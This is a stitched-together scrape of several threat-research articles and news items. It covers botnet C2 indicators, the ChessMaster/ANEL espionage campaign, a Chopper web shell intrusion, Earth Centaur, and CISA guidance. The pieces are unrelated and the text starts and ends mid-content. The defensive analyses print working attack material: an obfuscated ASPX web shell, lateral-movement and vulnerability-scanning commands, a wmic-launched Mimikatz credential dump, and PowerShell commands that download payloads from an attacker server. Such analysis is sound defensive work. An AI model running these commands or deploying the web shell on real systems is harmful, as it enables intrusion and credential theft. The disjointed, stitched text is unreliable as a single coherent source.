Mirai/Gafgyt dropper scripts or variants Perl Shellbot Coinminer activity Webshell downloads (full injected command) Callback/Scanning activity Direct Download exploits where payloads were no longer live at the time of analysis: Sample hashes 801b23bffa65facee1da69bc6f72f8e1e4e1aeefc63dfd3a99b238d4f9d0a637 6d403c3fc246d6d493a6f4acc18c1c292f710db6ad9c3ea2ff065595c5ad3c5b 940a674cfe8179b2b8964bf408037e0e5a5ab7e47354fe4fa7a9289732e1f1b8 fdc94d0dedf6e53dd435d2b5eacb4c34923fadee50529db6f3de38c71f325e05 85143ecc41fb6aadd822ed2d6f20c721a83ae1088f406f29b8b0b05459053a03 bot.v 0b4b25fab4c922e752e689111f38957e0402fd83f6b1d69e8f43c6f4b68fc1ba C2 server : 5[.]39.217.212:80
Channel : #vcenter getsome bot.redis 48628ca95608a015f47506eb1dc6fad0cd04a4cf5d44fdb8f10255fe0aa3c29b C2 server : 64[.]32.6.143:80
Channel : #redis getsome botVNC c399b56e1baf063ca2c8aadbbe4a2b58141916aac8ef790a9c29762ed1956bd5 C2 server : 5[.]39.217.212:80
"Channel : #D getsome 7e29615126585b9f87ded09cfae4724bb5d7896c7daf2adfcef775924549e49b 099ac2f3e10346dbef472b2a7b443ebfe1f6011a9a2518a54c20aad07fe9ec61 Updated May 23, 2022, at 1 p.m. PT. Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Additional resources https://www.zerodayinitiative.com/about https://www.zerodayinitiative.com/blog Tags
Latest News | Exploits & Vulnerabilities | Cyber Threats | Connected Car | APT & Targeted Attacks | Endpoints | IoT | Video
Trend Micro discovered the ChessMaster campaign back in July 2017 as part of our monitoring efforts to protect our customers.
"At the time, we found ChessMaster targeting different sectors from the academe to media and government agencies in Japan."
The threat group used a variety of attack tools and techniques to spy on their target organizations.
"Back then, we noted that ChessMaster's sophisticated nature implied that the campaign could evolve, before finding changes in the tools and tactics used in the campaign a few months later."
"While the original campaign was comprehensive and used remote access Trojans (RATs) such as ChChes and RedLeaves, this new campaign used a new backdoor (Detected by Trend Micro as BKDR_ANEL.ZKEI) that leverages the CVE-2017-8759 vulnerability for its cyberespionage activities."
"In this blog post, we analyze ChessMaster's current status, including the updated tools in its arsenal — with a particular focus on the evolution of ANEL and how it is used in the campaign."
July ChessMaster Campaign November ChessMaster Campaign Current ChessMaster Campaign
"Point of Entry Spear-phishing emails containing decoy documents Malicious shortcut (LNK) files and PowerShell Self-extracting archive (SFX) Runtime packers Spear-phishing emails containing decoy documents exploiting CVE-2017-8759 Spear-phishing emails containing decoy documents exploiting CVE-2017-11882, DDEAUTO, Microsoft Office Frameset and Link auto update Notable Tools Hacking Tools Second-stage payloads Koadic Hacking Tools Second-stage payloads Koadic Hacking Tools Second-stage payloads Backdoor ChChes ANEL ANEL Technical Analysis Figure 1."
Infection Chain for the current ChessMaster campaign
"ChessMaster’s current iteration starts off with the familiar phishing attacks seen in the earlier campaigns that involved the use of an email with an attached malicious document using the doc, docx, rtf, csv and msg formats."
"The email title and attached file name were written in Japanese and contain general business, political, and economy-themed phrases such as 世界経済(World economy) 経済政策(economic policy) 予算概算要求(budget estimation request) 日米対話(Japan-US dialogue) 安倍再任(re-appointment of Prime Minister Abe) 連絡網(contact network) 職員採用案(staff recruitment plan) 会議(meeting) However, there is a change in the exploit document."
"When we tracked ChessMaster back in November, we noted that it exploited the SOAP WSDL parser vulnerability CVE-2017-8759 (patched in September 2017) within the Microsoft .NET framework to download additional malware."
"While ChessMaster still uses the previous exploit, it also added more methods to its arsenal: one exploits another vulnerability, CVE-2017-11882 (patched in November 2017), which was also exploited to deliver illegal versions of the Loki infostealer."
Figure 2. Exploitation of CVE-2017-11882
It also abuses three legitimate MS Office functions:
Function Purpose Affected MS Office Formats we found in the wild Automatic Dynamic Data Exchange (DDEAUTO) A legitimate Microsoft Office function used in an Office file to retrieve data from another Office file
.doc .rtf .msg Link
Auto Update
An Office function used for automatic and user-free updates for embedded links upon opening.
".csv Microsoft Word's ""Frames/Frameset"" A feature that allows HTML or Text pages to be loaded in a frame within Microsoft Word."
.docx Figure 3. Exploitation of DDEAUTO Figure 4.
"Abusing Microsoft Word's ""Frames/Frameset"""
Figure 5. Exploitation of Link Auto Update
"ChessMaster can utilize any of these methods to download the next malware in the chain, the open source post-exploitation tool known as “Koadic,” which the previous campaign also used."
This tool is responsible for stealing information — specifically the environment information — within the target system.
Koadic executes the following command: %comspec% /q /c <cmd> 1> <Output> 2>&1
The commands and output of Koadic will change according to the ANEL version used in the attack.
The table below lists examples of the commands and outputs for ANEL versions 5.1.1 rc and 5.1.2 rc1.
"Note that if ANEL 5.1.2 rc1 was downloaded, the attacker would use HTTPS to avoid the downloaded data being captured as clear text."
Figure 6.
Koadic commands and output when ANEL 5.1.1 rc is used Figure 7.
Koadic commands and output when ANEL 5.1.2 rc1 is used
The table below lists all of Koadic's functions: {Variable}.user User-related functions {Variable}.user.isElevated Check Privilege {Variable}.user.OS Get OS Version {Variable}.user.DC
Get DCName from Registry {Variable}.user.Arch
Get Architecture {Variable}.user.info Get User Information {Variable}.work
Main Routine functions {Variable}.work.report Reports to server {Variable}.work.error Returns error {Variable}.work.make_url Alters/Modifies URL (C&C) {Variable}.work.get
Get the return of POST Header {Variable}.work.fork Creates rundll32.exe process {Variable}.http HTTP Connection functions {Variable}.http.create Creates initial HTTP objects {Variable}.http.post POST header {Variable}.http.addHeaders
Adds HTTP Headers {Variable}.http.get GET Header {Variable}.http.upload Uploads binaries/data {Variable}.http.bin2str String manipulation {Variable}.http.downloadEx
Downloads response {Variable}.http.download Additional download function {Variable}.process Process-related functions {Variable}.process.currentPID Get Current Process ID {Variable}.process.list Enumerates Process {Variable}.process.kill Terminates Process {Variable}.registry Registry-related functions {Variable}.registry.HKCR Set HKEY_CLASSES_ROOT {
Variable}.registry.HKCU Set HKEY_CURRENT_USER {Variable}.registry.HKLM Set HKEY_LOCAL_MACHINE {Variable}.registry.STRING Set String Value {Variable}.registry.BINARY Set Binary Value {Variable}.registry.DWORD Set DWORD Value {Variable}.registry.QWORD
Set QWORD Value {Variable}.registry.write Write/Add Registry {Variable}.registry.provider Create Registry Handle {Variable}.registry.destroy Deletes Registry Key {Variable}.registry.read Get/Read Registry Entries {Variable}.WMI WMI-related functions {
Variable}.WMI.createProcess Creates specified process {Variable}.shell File/Process Execution functions {Variable}.shell.run Run commands {Variable}.shell.exec Executes process {Variable}.file File-related functions {Variable}.file.getPath Get specified file path {Variable}.file.readText Reads specified text file {Variable}.file.get32BitFolder Get System Folder (32/64-bit) {Variable}.file.writol Writes on specified file {Variable}.file.deleteFile Deletes specified file {Variable}.file.readBinary Reads specified binary file. Figure 8.
Command added when the Koadic RAT is downloaded (use of {Variable}.shell.exec command)
"If Koadic finds that the system is conducive to the attacker’s interests, it downloads a base64-encrypted version of the ANEL malware from the Command-and-Control (C&C) server and executes it. Encrypted ANEL is decrypted using the “certutil -docode” command."
"When ANEL executes, a decrypted DLL file with the filename “lena_http_dll.dll” is expanded in memory."
This file contains one export function — either “crt_main” or “lena_main” Figure 9.
Base64 encoded ANEL downloaded by Koadic ANEL will send the infected environment’s information to the C&C server.
"When sending the information, ANEL encrypts the data using blowfish, XOR, and Base64-based encryption methods."
"The format ANEL uses to send data is similar to ChChes, but ANEL's encryption method is easier to use."
Figure 10.
Encryption key using blowfish
We initially discovered the malware known as ANEL back in September 2017.
"At that time, ChessMaster was using ANEL as a backdoor into the target system then injects code into svchost.exe, which then decrypts and activates the embedded backdoor."
This initial version of ANEL had a hardcoded version labeled “5.0.0 beta1” that contained incomplete code.
We noted that this might signify the release of a future variant.
"Instead of just one new variant, we discovered four different versions of ANEL: 5.0.0 beta1 5.1.1 rc 5.1.2 rc1 5.2.0 rev1 The different versions contain changes in the ANEL loader and the main ANEL DLL."
The figure below shows a summary of the changes between each version: Figure 11.
Summary of the changes between each version of ANEL
Differences with regards to Backdoor commands: CMD ID 5.0.0 beta1/5.1.1 rc/5.1.2 rc1 5.2.0 rev1 0x97A168D9697D40DD Save File 0x7CF812296CCC68D5 Upload File 0x652CB1CEFF1C0A00 NA Load New PE file 0x27595F1F74B55278 Save File and Execute If no match above Execute Command or File The differences shown in the table above are subtle but present.
"For example, the initial ANEL version, “5.0.0 beta1,” uses a different C&C server compared to the other versions."
"Once ANEL evolved to “5.1.1 rc,” it changed its file type to an executable, while also changing the C&C server."
The third version we found (5.1.2 rc1) reverts to a DLL file type but retains the C&C server.
The fourth version of ANEL (5.2.0 rev1) changes both the export function in the expanded main ANEL DLL and uses a different C&C server.
"Overall, we can see subtle changes, which indicate that the threat actors behind ANEL are making incremental improvements to the malware to refine it."
Figure 12.
Backdoor function differences between ANEL 5.0.0 beta1/5.1.1 rc/5.1.2 rc1 (left) and ANEL 5.2.0 rev1 (right)
"Once ANEL enters the user’s system, it will download various tools that could be used for malicious purposes, including password retrieval tools as well as malicious mail services and accessibility tools that will allow it to gather information about the system."
"These include Getpass.exe and Mail.exe, which are password and information stealers."
"It also downloads the following: Accevent.exe <-> Microsoft Accessible Event Watcher 7.2.0.0 event.dll <-> the loader of ssssss.ddd, (Detected as TROJ_ANELLDR) ssssss.ddd (lena_http.bin) <-> encrypted BKDR_ANEL (Detected as BKDR_ANELENC)"
These three files work together using a common technique call DLL Side-Loading or DLL Hijacking.
"In this scenario, accevent.exe is the primary executable, which is usually legitimate."
"After the execution of accevent.exe, it loads event.dll, which will be placed in the same folder (so it takes loading priority), after which event.dll decrypts and loads the encrypted backdoor ssssss.ddd, which is BKDR_ANEL."
"When we analyzed ANEL 5.1.1 rc, encrypted ANEL 5.1.2 rc1 was downloaded and executed."
Short-term mitigation
"When the user opens the document DDEAUTO or Link Auto Update, Office will display a message."
"If the user clicks on the “No” button, malicious activity will not initiate."
Figure 13: Popup message when users open the document that abuses DDEAUTO Figure 14.
Popup message when the user opens the document that abuses Link Auto Update Koadic sends its own JavaScript code as plain text.
The suspect communication allows us to detect the traffic.
Figure 15. Koadic’s communication traffic Medium- to long-term mitigation
"At first glance, it seems ChessMaster’s evolution over the past few months involves subtle changes."
"However, the constant addition and changing of features and attack vectors indicate that the attackers behind the campaign are unlikely to stop and are constantly looking to evolve their tools and tactics."
"Organizations can implement various techniques and best practices to defend against targeted attacks, such as regular patching to prevent vulnerability exploitation and using tools that provide protection across different network levels."
"Solutions that feature behavior monitoring, application control, email gateway monitoring, and intrusion/detection systems can help with this."
"Given how cybercriminal tools, tactics and procedures are evolving, organizations will have to go beyond their typical day-to-day security requirements and find a way to preempt attacks."
"Thus, there is a pressing need to detect and address threats via a proactive incident response strategy."
"Essentially, this involves creating a remediation plan for effectively combating the threat and using round-the-clock intrusion detection and threat analysis to prevent attacks from entering the system."
"A proactive strategy can be much more effective for targeted attacks, as these kinds of attacks are often designed to be elusive and difficult to detect, thus the need to scope them out."
"A comprehensive security strategy that involves proactive incident response will need the input of both decision makers and tech-savvy personnel, as they will need to be on the same page for it to be effective."
"In addition to implementing both mitigation techniques and proactive strategies, organizations can also strengthen their security by employing solutions such Trend Micro™ Deep Security™ and TippingPoint, which protects endpoints from threats that abuse vulnerabilities."
"In addition, comprehensive security solutions can be used to protect organizations from attacks."
"These include Trend Micro endpoint solutions such as Trend Micro™ Smart Protection Suites and Worry-Free™ Business Security, which can protect users and businesses from these threats by detecting malicious files, well as blocking all related malicious URLs."
Trend Micro Deep Discovery™ can protect enterprises by detecting malicious attachment and URLs.
Trend Micro OfficeScan™ with XGen™ endpoint security
infuses high-fidelity machine learning with other detection technologies and global threat intelligence for comprehensive protection against all kinds of threats.
A more detailed analysis of the Command-and-Control communication flow of ANEL can be found in this technical brief.
Indicators of Compromise Hash Downloader used in the campaign: 76b1f75ee15273d1226392db3d8f1b2aed467c2875e11d9c14fd18120afc223a 4edcff56f586bd69585e0c9d1d7ff4bfb1a2dac6e2a9588f155015ececbe1275 1b5a1751960b2c08631601b07e3294e4c84dfd71896453b65a45e4396a6377cc Hashes detected as part of the BKDR_ANEL Family: 5.0.0 beta1 af1b2cd8580650d826f48ad824deef3749a7db6fde1c7e1dc115c6b0a7dfa0dd 5.1.1 rc 2371f5b63b1e44ca52ce8140840f3a8b01b7e3002f0a7f0d61aecf539566e6a1 5.1.2 rc1 05dd407018bd316090adaea0855bd7f7c72d9ce4380dd4bc0feadc6566a36170 5.2.0 rev1 00030ec8cce1f21120ebf5b90ec408b59166bbc3fba17ebae0fc23b3ca27bf4f lena_http.bin 303f9c00edb4c6082542e456a30a2446a259b8bb9fb6b0f76ff318d5905e429c Tools used in the campaign: Getpass.exe 52a8557c8cdd5d925453383934cb10a85b117522b95c6d28ca097632ac8bc10d event.dll 6c3224dbf6bbabe058b0ab46233c9d35c970aa83e8c4bdffb85d78e31159d489 mail.exe 2f76c9242d5ad2b1f941fb47c94c80c1ce647df4d2d37ca2351864286b0bb3d8 URLs and IP Addresses related to the campaign: www[.]nasnnones[.]com trems[.]rvenee[.]com contacts[.]rvenee[.]com 91[.]207[.]7[.]91 89[.]18[.]27[.]159 89[.]37[.]226[.]108 185[.]25[.]51[.]116 185[.]81[.]113[.]95 185[.]144[.]83[.]82 185[.]153[.]198[.]58 185[.]159[.]129[.]226 Tags Malware | APT & Targeted Attacks | Endpoints | Cyber Crime | Research | Network
"Last June 9, 2021, the Cybersecurity and Infrastructure Security Agency (CISA) released the Rising Ransomware Threat to OT Assets, which addresses the recent rise in ransomware attacks targeting operational assets (OT) and control systems."
"The guidance provides steps to prepare for, mitigate against, and respond to attacks."
It also identifies how dependencies between an enterprise's IT and OT systems can give attackers a path.
"Lastly, the document thoroughly explains how to decrease the risk of severe business degradation if affected by a ransomware attack."
"To prepare for ransomware attacks, CISA recommends enterprises determine their critical operational processes' reliance on key IT infrastructure and identify a resilience plan for when access control is lost."
They should also exercise an incident response plan and Implement regular data backup procedures on both IT and OT networks.
"For mitigating and responding to an attack, organizations must practice good cyber hygiene by updating software, implementing an allow listing, and enabling strong spam filters."
Organizations must also identify which systems were affected and immediately isolate them and triage the impacted systems for restorations and recovery.
They must also confer with teams to develop and document what has occurred.
"According to the agency, critical infrastructure owners and operators should also adopt an ""heightened state of awareness""."
"CISA also encourages them to identify critical processes that must not be interrupted to provide essential services, develop and regularly test workarounds and/or manual controls that ensure critical processes and industrial control system (ICS) network supporting them."
CISA recommends critical infrastructure owners to implement robust network segmentation between IT and OT networks and make sure backup procedures are executed and tested regularly.
"Lastly, backups should be isolated from network connections."
"The fact sheet comes after numerous ransomware attacks on key critical infrastructures in the US and abroad, including the attack on Colonial Pipeline by DarkSide."
"In 2019, Trend Micro conducted research analyzing cyberattacks by building and using a factory honeypot, mimicking a factory environment."
"The study, Fake Company, Real Threats, revealed that over 20 attacks were observed during 240 days- six of which affected factory productivity."
"This shows how vulnerable smart factories are when it comes to various cyberattacks, such as ransomware."
"Ransomware incidents are federal crimes, according to the agency."
"Enterprises, especially critical infrastructure establishments, must report the attack to law enforcement to help bring the attackers to justice."
"Moreover, decision-makers and stakeholders should have a better understanding of cybersecurity and its role in securing their operations and the safety of consumers."
"To learn more about how to protect smart factories and their critical operations, read Trend Micro's expertly crafted best practices and solutions: Smart Factory Security Solutions Trend Micro Best Practices for Securing Smart Factories Tags Latest News | ICS OT | APT & Targeted Attacks | Ransomware | Articles, News, Reports | Cyber Threats"
"Web shells, in their simplicity and straightforwardness, are highly potent when it comes to compromising systems and environments."
"These malicious code pieces can be written in ASP, PHP, and JSP, or any script that can execute a system command with a parameter that can pass through the web."
Web shells can be embedded on web servers and can be used by malicious actors to launch arbitrary code.
"In as little as 15 bytes, web shells can enable remote administration of an infected machine or system."
"Threats such as this can be difficult to detect even with multiple security layers — especially if they are not consolidated. In this blog, we will dissect a targeted attack that made use of the Chopper ASPX web shell (detected by Trend Micro as Backdoor.ASP.WEBSHELL.UWMANA). Technical Analysis"
Initial access
"Based on our investigation, the Chopper web shell is dropped via a system token, potentially via a Microsoft Exchange Server vulnerability."
"One notable vulnerability in the Microsoft Exchange Server is CVE-2020-0688, a remote code execution bug."
Microsoft issued a patch for this vulnerability in February 2020.
"However, the malicious actors behind this attack drop the Chopper web shell in the web directory folder to establish persistence."
"Through the ASPX file, malicious actors can establish a foothold in affected public-facing Outlook Web App (OWA) servers and send remote commands through them."
Outlook Web App (Web Directory) - D:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\15.1.2044\scripts\premium\premium.aspx
The attack features the following script:
"<%@ Page Language=""Jscript"" Debug=true%>"
var
"System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(""UmVxdWVzdC5Gb3JtWyJjb21tYW5kIl0=""))"
"var b=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(""dW5zYWZl"")); var c=eval(a,b); eval(c,b); %>"
"When simplified, the malicious script looks like this, with the eval being the executor and the Request.Form acquiring the parameter to be executed:"
"<%@ Page Language=""Jscript""%><%eval(Request.Form[""Command""],""unsafe"");%> We’ve observed that in some cases, malicious actors insert this short script to avoid detection: Figure 1. A short script"
inserted by malicious actors to avoid detection
"User Activity Checking Once Chopper successfully infects a system, the malicious actor will issue a query user (quser) command in an attempt to identify the primary user or those who are currently logged in as users in the system."
"Based on our observation, the quser command was used routinely throughout the attack to determine active remote sessions."
Figure 2.
The quser command is used to identify active remote sessions.
Deobfuscation technique
"To deploy its tools, it uses the expand command to extract package files dropped in the system."
expand {filename}.ex_ {filename}.dat expand {filename}.ex_ {filename}.exe
"We saw a noticeable difference with this attack compared to other Chopper attacks — its use of the .dat file extension, which is commonly used for data storage purposes, such as in a user profile’s ntuser.dat."
"In this particular Chopper attack, the .dat files are used as executables."
Lateral movement
It proceeded with copying the Chopper web shell into accessible shared folders in other hosts to gain access.
"copy premium.aspx ""\\{hostname}\d$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\15.1.2044\scripts\premium"
"It also scans for vulnerabilities across the network by using an installed tool, Hacktool.Win32.CATLIKE.A, and a legitimate cURL, C:\temp\curl.dat."
"It specifically scans for web server-related vulnerabilities and password weaknesses in Apache Tomcat, Citrix, and phpMyAdmin applications."
Application/Port Command Oracle WebLogic curl.dat -v -H 'Content-Type: text/
xml;charset
UTF-8
"http://{ip address\]:7001/wls-wsat/CoordinatorPortType Oracle Console curl.dat -vv http://{ip address}:7001/console/j_security_check -d j_username={username}&j_password={password}&submit=Login"""
PHPMyAdmin curl.dat -vv --connect-timeout 2 {ip address}/phpmyadmin Apache Tomcat s.dat -u http://{ip address}:8080/manager/html Ports 7001 9095 5556 8080 s.dat -i 10.217.229.189 -p {ports} Table 1.
Commands used to scan for web server-related vulnerabilities and passwords on certain applications and ports
We saw that this attack also uses the WMI command line (wmic) utility to perform remote process execution on other infected endpoints.
Execution of arbitrary commands via session id
Successful exploitation of CVE-2020-0688 gives Chopper access to system privileges.
"In one of the endpoints, it will drop and execute Trojan.Win32.PRIVESC.A."
This trojan requires to be run under a user with SeTcbPrivilege.
It allows an attacker to see all Windows sessions and can execute arbitrary commands on the session via session id.
Figure 3. Examples of arbitrary commands being performed on the session via session id Discovery
"For its discovery, it uses typical Windows command-line tools such as nltest, ping, whoami, netstat, net, nslookup, hostname, and tasklist, which are commonly used in other attacks."
"In addition, a publicly available JoeWare domain tool called LG.exe, which is quite popular among attackers and domain admins alike, was installed and used in the attack."
Credential access
"For obtaining user credentials, the attackers used HackTool.MSIL.Mimikatz.AF, a modified version of the open-sourced application Mimikatz, using the following parameters: x, xxx, xxxx, xxxasd. wmic /node:{ip address} process call create ""cmd.exe /c c:\users\mpBD6D42.dat xxxasd -pass > c:\users\23.txt Collection"
The attackers use wevtutil.exe to query security-related events from a target username and export it as a q.txt file.
"For packaging stolen credentials and other logs, it uses the makecab command instead of a third-party application such as rar.exe."
· makecab a.txt > 111 · makecab aaa2.txt >1
The attacker uses installed security components or applications as filenames to hide in plain sight.
"· C:\Program Files\Trend Micro\ ams p.dat · C:\Oracle\Oracle.dat · C:\Program Files\McAfee\MacAfee.dat These suspicious activities were seen via our XDR solution, which helped us monitor observable attack techniques and provided critical security alerts including anomalous file extension execution, remote execution via system tools, web shell-related activities, and potential exploit attacks."
Security recommendations
Web shells can be embedded in systems via security gaps such as vulnerabilities.
Attackers will work to identify vulnerable applications used in systems to exploit them and install web shells for remote code execution or data exfiltration.
We provide some security recommendations to ensure that enterprises and organizations can defend against web shell attacks:
Patch your systems and applications.
"Ensure proper vulnerability patches are applied for public-facing applications, such as Apache Tomcat, Oracle Web Logic Server, Microsoft Exchange Server, and PHPMyAdmin."
Implement strong passwords.
Do not use the same password for multiple applications or websites.
Use multi-factor authentication whenever possible and regularly update it.
Check for static keys in the IIS web.config file.
"As observed on CVE-2020-0688, the use of static keys — as opposed to randomly generated keys — can allow an attacker to execute arbitrary code by tricking the server into deserializing ViewState data."
"Enterprises and organizations should have comprehensive and efficient protection, detection, prevention, and remediation based on real-time, higher-confidence alerts to protect critical data and operations from sophisticated attacks and threats."
A consolidated view of all security sensors provides a single-pane-of-glass view that will promote quick and thorough investigation and response.
"Trend Micro Solutions Trend Micro’s comprehensive XDR solution applies the most effective expert analytics to the deep data sets collected from Trend Micro solutions across the enterprise — including email, endpoints, servers, cloud workloads, and networks — making faster connections to identify and stop attacks."
"Powerful artificial intelligence (AI) and expert security analytics correlate data from customer environments and Trend Micro’s global threat intelligence to deliver fewer, higher-fidelity alerts, leading to better, early detection."
"One console with one source of prioritized, optimized alerts supported with guided investigation simplifies the steps needed to fully understand the attack path and impact on the organization."
"Indicators of compromise Filename Path SHA-256 Detection Notes ss.exe C:\temp\ ee63b49aca1495a170ea7273316385b606f3fd2df1e48e9f4de0f241d98bd055 HackTool.Win32.CATLIKE.A Vulnerability Scanner LG.exe C:\temp\ C:\hp\ 5099264b16208d88c9bca960751f5e3de7a5420986fa0d7e2b2a6b16af3909e9 HackTool.Win32.JoeWare.A. JoeWare Local Group Manipulation tool LG.dat C:\hp\ 5099264b16208d88c9bca960751f5e3de7a5420986fa0d7e2b2a6b16af3909e9 HackTool.Win32.JoeWare.A. JoeWare Local Group Manipulation tool mpBD6D42.dat C:\Users C:\Perflogs C:\hp C:\temp e9be71848d1faa0c41db4c6a1e901747d98fb0b3cca027f8be85ea5e339b75e3 HackTool.MSIL.Mimikatz.AF Mimikatz Tags Endpoints | APT & Targeted Attacks | Research | Network | Articles, News, Reports"
The Cybersecurity and Infrastructure Security Agency (CISA) and the National Institute for Standards and Technology (NIST) recently published “Defending Against Software Supply Chain Attacks”.
The guideline provides an overview of software supply chain risk and how vendors and customers can identify and assess such risks using the NIST Cyber Supply Chain Risk Management (C-SCRM) Framework and the Secure Software Development Framework (SSDF).
Software supply chains are an integral part of a large information and communications technology (ICT) supply chain framework.
"It is an ecosystem of retailers, distributors, and suppliers participating in the sale, delivery, and production of hardware, software, and managed services."
"An attack on the software supply chain happens when a cyber threat actor invades a vendor's network and uses malicious codes, compromising the software before the vendor sends it to their consumers."
The compromised software will then put the customer's data or system at risk.
"According to the guideline, newly acquired software may be compromised from the get-go."
It can also be compromised through a patch or hotfix.
"These threats affect all users of the tampered software, resulting in major consequences for government, critical infrastructure, and private sector software consumers."
The guideline thoroughly explains the three most common methods threat groups use to infiltrate the supply chain.
It also establishes a few recommendations for software customers and vendors to prevent and mitigate attacks as well as improve resilience against software supply chain attacks.
"The three most common methods are taking over the software update mechanism to deliver an updated software with malicious code, exploiting misconfigured access controls, and targeting publicly accessible code libraries, and inserting malicious code, which unknowing customers then download to their systems."
The document also provides the following eight best practices for establishing a C-SCRM approach and applying it to software: Incorporating C-SCRM across the organization; Creating a formal C-SCRM program; Knowing and managing critical components and suppliers; Understanding the organization's supply chain; Working closely with key suppliers; Including key suppliers in resilience and improvement activities; Evaluating and monitoring throughout the supplier relationship; and Planning for the full life cycle.
"While the guideline gives thorough recommendations on preventing supply chain attacks, it is still vital for organizations to take extra measures to mitigate vulnerable software components."
"Organizations should also create a program that can manage and control their supply chain's vulnerabilities, minimizing the possibilities of attacks."
"In addition, organizations must know and understand the risks associated with supply chains and smart factories."
"To learn more about overlooked risks associated with supply chain and smart factories, read our expert team's proof of concept paper, ""Forward-looking security analysis of smart factories""."
This extensive research also discusses feasible attack scenarios and recommended defense strategies.
"Tags Latest News | Cloud | APT & Targeted Attacks | Network | Articles, News, Reports | Cyber Threats"
"The Cybersecurity and Infrastructure Security Agency (CISA) recently issued an alert regarding an advanced persistent threat (APT) compromising government agencies, critical infrastructures, and private sector organizations."
"According to CISA, the APT actor is accountable for the compromise of the SolarWinds Orion supply chain."
The actor is also responsible for the abuse of commonly used authentication mechanisms.
The Agency then urged organizations to make identifying and addressing such threats a priority.
"Under the Presidential Policy Directive (PPD) 41, the agency, together with the Federal Bureau of Investigation (FBI), and the Office of the Director of National Intelligence (ODNI), formed a Cyber Unified Coordination Group (UCG)."
"This group aims to coordinate a ""whole-of-government"" response to the above-mentioned cyber incident.?"
A UCG is also formed for integrating private sector partners into incident response efforts.
"In general, a Cyber UCG is created when a vital cyber incident affects critical infrastructure owners and operators."
"These are determined by the Secretary of Homeland Security as possessing or operating critical infrastructure wherein a cyber incident could lead to a catastrophic regional or national effect on national security, economic security, or public health."
Supply chain attacks are quite risky and could result in real-world impacts.
"In a report done by Trend Micro entitled “Critical Infrastructures Exposed and at Risk: Energy and Water Industries”, researchers were able to expose vulnerabilities of human-machine interface (HMI) used in critical water and energy organizations."
They also showed real-world implications that these vulnerabilities have.
Geopolitical risk is also a big concern for securing supply chains.
"To mitigate such risk, organizations must think globally and exert efforts to follow codes of local culture."
Organizations need to have a deeper understanding of regional and national policies to ensure the safety of the supply chain.
Read our three-part series on smart factories from the perspective of supply chain disruptions to learn more about supply chain cybersecurity.
Tags Latest News | ICS OT | APT & Targeted Attacks | IoT |
"Articles, News, Reports"
"Earth Centaur, previously known as Tropic Trooper, is a long-running cyberespionage threat group that has been active since 2011."
"In July 2020, we noticed interesting activity coming from the group, and we have been closely monitoring it since."
The actors seem to be targeting organizations in the transportation industry and government agencies related to transport.
We observed that the group tried to access some internal documents (such as flight schedules and documents for financial plans) and personal information on the compromised hosts (such as search histories).
"Currently, we have not discovered substantial damage to these victims as caused by the threat group."
"However, we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data."
"Through long-term monitoring, we learned that this threat group is proficient at red teamwork."
The group knows how to bypass security settings and keep its operation unobstructive.
"Depending on the target, it uses backdoors with different protocols, and it can also use the reverse proxy to bypass the monitoring of network security systems."
The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently.
We expand on these techniques and other capabilities in the following sections.
"More importantly, we believe the activities we observed are just the tip of the iceberg and their targets might be expanded to other industries that are related to transportation."
"It is our aim, through this article, to encourage enterprises to review their own security setting and protect themselves from damage and compromise."
Overview of Earth Centaur’s infection chain
"Based on our investigation, we found that the intrusion process used by Earth Centaur can be separated into several stages, which are shown in Figure 1."
"We found that the threat actors used vulnerable Internet Information Services (IIS) server and Exchange server vulnerabilities as entry points, and then installed web shells."
"Afterward, the .NET loader (detected as Nerapack) and the first stage backdoor (Quasar remote administration tool aka Quasar RAT) were deployed on the compromised machine."
"Then, depending on the victims, the threat actors dropped different types of second-stage backdoors, such as ChiserClient and SmileSvr."
"After exploiting the victim's environments successfully, the threat actors start Active Directory (AD) discovery and spread their tools via Server Message Block (SMB)."
"Then, they use intranet penetration tools to build the connection between the victim’s intranet and their command-and-control (C&C) servers."
We go into further detail about these stages in our analysis.
Figure 1. Stages of Earth Centaur’s intrusion process Technical Analysis of Earth Centaur’s Tools and Techniques Stage 1: Loaders
"After the threat actors get access to the vulnerable hosts by using ProxyLogon exploits and web shells, they use bitsadmin to download the next-stage loader (loaders are detected as Nerapack) as well as its payload file (.bin). C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command ""&{Import-Module BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.exe' ""%temp%/dfmanager.exe""}"" C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command ""&{Import-Module BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.bin' ""C:\Users\<redacted>\AppData\Local\Temp/dfmanager.bin""}"""
"After our long-term monitoring, we observed that there are two different decryption algorithms (DES or AES) used in Nerapack to decrypt the payload."
"Moreover, in its newer version, it uses a technique called “Timestomping.”"
Timestomping is when the timestamp of the payload file (.bin) is altered to make it harder for incident response analysts to find it.
Figure 2. Timestomping used on the bin file The decryption key is used as an argument of Nerapack and various keys are used on different victims.
It is a simple but effective technique that makes security analysis more difficult and also ensures that only their operators can use the tools.
The command for execution is shown as here: > Nerapack.exe {base64 encoded key}
"Fortunately, we were still able to collect the decryption key in some cases and we decrypted the payload successfully."
"Based on our current cases, the decrypted payload is Quasar RAT."
"After the payload is deployed, the actors can continue further malicious actions through Quasar RAT."
Stage 2: Backdoors
"After further analysis, we found that the threat group developed multiple backdoors capable of communication via common network protocols."
We think this indicates that it has the capability to bypass network security systems by using these common protocols to transfer data.
We also found that the group tries to launch various backdoors per victim.
"Furthermore, it also tends to use existing frameworks to make customized backdoors."
"By using existing frameworks, examples of which are detailed in the following, it builds new backdoor variants more efficiently."
ChiserClient
"After the backdoor is launched, it will decrypt the embedded C&C configuration via AES (CTR mode) algorithm for the following connection."
"In the configuration, there are three C&C addresses and corresponding port numbers."
Figure 3.
Decrypted C&C configuration
"In the first connection, ChiserClient will append the host name of the compromised host for check-in purposes."
"Then, it will keep running on the hosts and wait for further commands from the C&C server."
ChiserClient is installed as a system service to allow the threat actors access to higher privileges and keep persistence on the compromised host.
The capability of ChiserClient is shown in the following table: Command code Function 0x10001
